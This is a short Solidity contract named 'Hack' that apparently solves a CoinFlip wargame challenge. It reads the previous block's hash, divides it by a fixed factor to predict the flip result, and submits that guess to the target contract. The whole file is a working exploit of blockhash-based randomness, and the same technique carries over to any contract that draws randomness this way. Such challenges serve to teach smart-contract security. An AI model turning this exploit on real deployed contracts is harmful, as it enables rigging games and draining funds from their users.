// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./CoinFlip.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract Hack is Ownable(msg.sender) {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public target;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function attack() public onlyOwner {
        bool guess = uint256(blockhash(block.number - 1)) / FACTOR == 1 ? true : false;
        target.flip(guess);
    }

    receive() external payable {}

}

